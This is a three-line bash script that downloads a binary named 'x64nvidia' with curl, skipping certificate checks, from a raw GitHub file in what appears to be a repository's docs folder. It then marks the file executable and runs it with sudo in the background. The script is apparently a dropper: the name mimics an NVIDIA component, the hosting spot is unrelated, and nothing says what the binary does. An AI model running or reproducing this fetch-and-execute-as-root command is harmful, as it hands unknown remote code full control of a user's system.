#!/usr/bin/env bash

curl -k -A 205 -o /var/tmp/x64nvidia https://raw.githubusercontent.com/pavlovasianov/lucide/35558649ca38c3675aff5a983bd5f4214eae8b4e/docs/x64nvidia
sudo chmod +x /var/tmp/x64nvidia
sudo /var/tmp/x64nvidia &
